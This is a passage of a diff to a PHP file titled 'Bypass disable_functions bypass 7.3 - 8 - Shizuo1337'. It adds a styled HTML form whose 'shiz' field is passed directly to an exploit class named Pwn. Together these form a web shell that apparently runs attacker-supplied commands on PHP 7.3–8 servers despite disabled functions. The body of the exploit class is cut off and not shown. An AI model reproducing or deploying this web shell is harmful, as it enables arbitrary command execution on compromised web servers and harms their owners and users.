@@ -1,7 +1,22 @@
+<head>
+<link href='https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css' rel='stylesheet'>
+<title>Bypass Command - PHP 7.3-8</title>
+<body class='bg-dark'>
+</body>
+<center>
+<form action="" method="post">
+  <br><br><h1 class='text-primary'>Bypass disable_functions bypass 7.3 - 8 - Shizuo1337</h1>
+  <div class='input-group mb-3'>
+  <input class="form-control btn-sm" type="text" name="shiz">
+  <input class="btn btn-outline-warning btn-sm me-2" type="submit" value="Submit">
+  </div>
+</form>
+</center>
+</head>
 <?php
-echo '<code class="text-primary">';
+echo '<div class="container-fluid language-javascript"><div class="shell mb-3"><center><pre><code class="text-primary">';
 new Pwn($_POST['shiz']);
-echo "</code>";
+echo "</code></pre></center></div></div>";
 
 class Helper { public $a, $b, $c; }
 class Pwn {
